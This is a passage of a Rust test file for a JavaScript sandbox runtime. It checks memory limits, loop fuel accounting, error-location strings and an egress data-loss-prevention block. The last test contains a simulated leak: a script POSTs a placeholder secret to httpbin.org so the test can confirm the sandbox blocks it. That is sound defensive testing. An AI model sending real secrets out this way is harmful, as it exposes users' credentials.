        out["json"]["parsedFast"]["floats"],
        serde_json::json!([1.5, -0.25, 3.125])
    );
    assert_eq!(
        out["json"]["parsedFast"]["mixed"],
        serde_json::json!(["a", null, null, null, {"k": "v"}])
    );
    assert_eq!(
        out["json"]["parsedFast"]["customToJson"],
        "custom-to-json-ok"
    );
    assert!(out["json"]["parsedFast"].get("undef").is_none());
    assert!(out["json"]["parsedFast"].get("fnVal").is_none());
    assert_eq!(out["json"]["prettyHasNewline"], true);
    assert_eq!(out["json"]["cyclicThrew"], true);
    assert_eq!(out["json"]["perfDeltaValid"], true);
}

#[test]
fn test_issues_42_43_44_45_sandbox_memory_loop_fuel_egress_dlp_and_error_location() {
    // 1. Issue #42 & #45: Guest `Slice.evalSandbox` `{ memory }` alias, non-accumulating transient
    //    child heap across repeated calls, and non-duplicated `:1:` error location.
    let guest_script = r#"
const memResults = {};
for (const mem of [65536, 1048576, 16777216, 1073741824]) {
  const r = Slice.evalSandbox(
    'const a = new Array(1000000).fill(7); a.length',
    { memory: mem }
  );
  memResults[mem] = {
    ok: r.ok,
    returnValue: r.returnValue,
    violation: r.violation,
    memoryUsedBytes: r.memoryUsedBytes,
  };
}
const smallOk = Slice.evalSandbox('1 + 1', { memory: 65536 });
const errBoom = Slice.evalSandbox('throw new Error("boom")');
const errJson = Slice.evalSandbox('JSON.parse("{bad")');
console.log(JSON.stringify({ memResults, smallOk, errBoom, errJson }));
"#;
    let m = run_source_isolated(
        "issues-42-45-tenant",
        guest_script,
        CapabilityToken::pure_compute(),
        50_000_000,
        16 * 1024 * 1024,
    )
    .expect("issues 42 & 45 guest script execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();

    // Issue #42 assertions
    assert_eq!(parsed["memResults"]["65536"]["ok"], false);
    assert!(
        parsed["memResults"]["65536"]["violation"]
            .as_str()
            .unwrap_or("")
            .contains("61440 bytes"),
        "expected 65536 (61440 net) ceiling violation, got: {}",
        parsed["memResults"]["65536"]
    );
    assert_eq!(parsed["memResults"]["1048576"]["ok"], false);
    assert!(
        parsed["memResults"]["1048576"]["violation"]
            .as_str()
            .unwrap_or("")
            .contains("1044480 bytes"),
        "expected 1048576 (1044480 net) ceiling violation, got: {}",
        parsed["memResults"]["1048576"]
    );
    assert_eq!(
        parsed["memResults"]["16777216"]["ok"], true,
        "16 MB child sandbox should succeed: {}",
        parsed["memResults"]["16777216"]
    );
    assert_eq!(parsed["memResults"]["16777216"]["returnValue"], "1000000");
    assert_eq!(
        parsed["memResults"]["1073741824"]["ok"], true,
        "1 GB requested (clamped to parent 16 MB) should succeed on 8 MB allocation: {}",
        parsed["memResults"]["1073741824"]
    );
    assert_eq!(parsed["memResults"]["1073741824"]["returnValue"], "1000000");
    assert_eq!(parsed["smallOk"]["ok"], true);
    assert_eq!(parsed["smallOk"]["returnValue"], "2");

    // Issue #45 assertions: no repeated location on `at <main>` and line is `:1:` (not `:2:`)
    let boom_err = parsed["errBoom"]["error"].as_str().unwrap_or("");
    assert!(
        boom_err.starts_with("Uncaught Error: boom"),
        "unexpected boom error: {}",
        boom_err
    );
    assert_eq!(
        boom_err.matches("(unknown at ").count(),
        1,
        "source location must not be duplicated in error string: {}",
        boom_err
    );
    assert!(
        boom_err.contains("unknown at :1:"),
        "single-line evalSandbox snippet should report line 1, got: {}",
        boom_err
    );
    let json_err = parsed["errJson"]["error"].as_str().unwrap_or("");
    assert!(
        json_err.starts_with("Uncaught SyntaxError:"),
        "unexpected JSON syntax error: {}",
        json_err
    );
    assert!(
        !json_err.contains(") ("),
        "JSON.parse error must not have trailing duplicate parenthetical location: {}",
        json_err
    );

    // 2. Issue #43: `while` and `do...while` loops report `fuel_used` proportional to iterations
    let mut host_iso = SliceIsolate::spawn(
        "issue-43-44-host",
        1,
        CapabilityToken::pure_compute().with_net_host("httpbin.org"),
        50_000_000,
        16 * 1024 * 1024,
    );
    let mut while_fuels = Vec::new();
    let mut do_while_fuels = Vec::new();
    for &n in &[1_000u64, 100_000, 1_000_000] {
        let w_out = host_iso.eval_sandbox(
            &format!("let i = 0; while (i < {n}) i++; i"),
            crate::SandboxEvalOptions::default(),
        );
        assert!(w_out.ok);
        while_fuels.push(w_out.fuel_used);

        let dw_out = host_iso.eval_sandbox(
            &format!("let i = 0; do {{ i++; }} while (i < {n}); i"),
            crate::SandboxEvalOptions::default(),
        );
        assert!(dw_out.ok);
        do_while_fuels.push(dw_out.fuel_used);
    }
    assert!(
        while_fuels[0] < while_fuels[1] && while_fuels[1] < while_fuels[2],
        "while loop fuelUsed must scale monotonically with iteration count: {:?}",
        while_fuels
    );
    assert!(
        do_while_fuels[0] < do_while_fuels[1] && do_while_fuels[1] < do_while_fuels[2],
        "do...while loop fuelUsed must scale monotonically with iteration count: {:?}",
        do_while_fuels
    );
    assert!(
        while_fuels[2] >= 4_000 && do_while_fuels[2] >= 4_000,
        "1M iterations should consume >= 4,000 fuel (got while={}, do_while={})",
        while_fuels[2],
        do_while_fuels[2]
    );

    let trapped_while = host_iso.eval_sandbox(
        "let i = 0; while (i < 500000) i++; i",
        crate::SandboxEvalOptions {
            fuel: Some(100_000),
            ..Default::default()
        },
    );
    assert!(!trapped_while.ok);
    assert!(
        trapped_while
            .violation
            .as_deref()
            .unwrap_or("")
            .contains("exceeded deterministic CPU instruction fuel limit (100000 ops)"),
        "unexpected trapped_while violation: {:?}",
        trapped_while.violation
    );

    let ok_while = host_iso.eval_sandbox(
        "let i = 0; while (i < 500000) i++; i",
        crate::SandboxEvalOptions {
            fuel: Some(10_000_000),
            ..Default::default()
        },
    );
    assert!(ok_while.ok);
    assert_eq!(ok_while.fuel_used, 500_010);

    // Issue #43 follow-up: `reported fuelUsed == smallest budget that completes` across `for`, `while`, `do-while`
    // 1. Exact 1,000,000-iteration parity check (`4005` for `for`, `1000010` for `while` and `do-while`)
    for (name, src, expected_fuel) in [
        (
            "for-1m",
            "let s = 0; for (let i = 0; i < 1000000; i++) s += i; s",
            4_005u64,
        ),
        (
            "while-1m",
            "let i = 0, s = 0; while (i < 1000000) { s += i; i++; } s",
            1_000_010u64,
        ),
        (
            "do-while-1m",
            "let i = 0, s = 0; do { s += i; i++; } while (i < 1000000); s",
            1_000_010u64,
        ),
    ] {
        let reported = host_iso
            .eval_sandbox(
                src,
                crate::SandboxEvalOptions {
                    fuel: Some(10_000_000),
                    ..Default::default()
                },
            )
            .fuel_used;
        assert_eq!(
            reported, expected_fuel,
            "{name}: unexpected reported fuelUsed"
        );
        let below = host_iso.eval_sandbox(
            src,
            crate::SandboxEvalOptions {
                fuel: Some(reported - 1),
                ..Default::default()
            },
        );
        assert!(
            !below.ok,
            "{name}: budget {}-1 must trap with CpuFuelExhausted",
            reported
        );
        let exact = host_iso.eval_sandbox(
            src,
            crate::SandboxEvalOptions {
                fuel: Some(reported),
                ..Default::default()
            },
        );
        assert!(
            exact.ok && exact.fuel_used == reported,
            "{name}: exact budget {reported} must complete with fuel_used == {reported}"
        );
    }

    // 2. Full binary-search parity check across `for`, `while`, `do-while`
    for (name, src, expected_fuel) in [
        (
            "for",
            "let s = 0; for (let i = 0; i < 100000; i++) s += i; s",
            405u64,
        ),
        (
            "while",
            "let i = 0, s = 0; while (i < 100000) { s += i; i++; } s",
            100_010u64,
        ),
        (
            "do-while",
            "let i = 0, s = 0; do { s += i; i++; } while (i < 100000); s",
            100_010u64,
        ),
    ] {
        let reported = host_iso
            .eval_sandbox(
                src,
                crate::SandboxEvalOptions {
                    fuel: Some(10_000_000),
                    ..Default::default()
                },
            )
            .fuel_used;
        assert_eq!(
            reported, expected_fuel,
            "{name}: unexpected reported fuelUsed"
        );

        let mut lo = 1u64;
        let mut hi = 2_000_000u64;
        while lo < hi {
            let mid = (lo + hi) / 2;
            let r = host_iso.eval_sandbox(
                src,
                crate::SandboxEvalOptions {
                    fuel: Some(mid),
                    ..Default::default()
                },
            );
            if r.ok {
                hi = mid;
            } else {
                lo = mid + 1;
            }
        }
        assert_eq!(
            reported, lo,
            "{name}: reported fuelUsed ({reported}) must equal smallest budget that completes ({lo})"
        );
    }

    // 3. Issue #44: Egress DLP block uses dedicated `EgressSecretLeakBlocked` message, not env var message
    let dlp_out = host_iso.eval_sandbox(
        r#"Slice.fetchSync("https://httpbin.org/post", { method: "POST", body: "leak=sk-secret-xyz" })"#,
        crate::SandboxEvalOptions {
            allow_net: vec!["httpbin.org".to_string()],
            audit_secret: Some("sk-secret-xyz".to_string()),
            ..Default::default()
        },
    );
    assert!(!dlp_out.ok);
    let dlp_violation = dlp_out.violation.as_deref().unwrap_or("");
    assert!(
        dlp_violation.starts_with("Egress DLP Violation (EGRESS_SECRET_LEAK_BLOCKED):"),
        "expected Egress DLP Violation prefix, got: {}",
        dlp_violation
    );
    assert!(
        !dlp_violation.contains("lacks environment variable authority"),
        "must not report Egress DLP violation as an environment variable error: {}",
        dlp_violation
    );
}
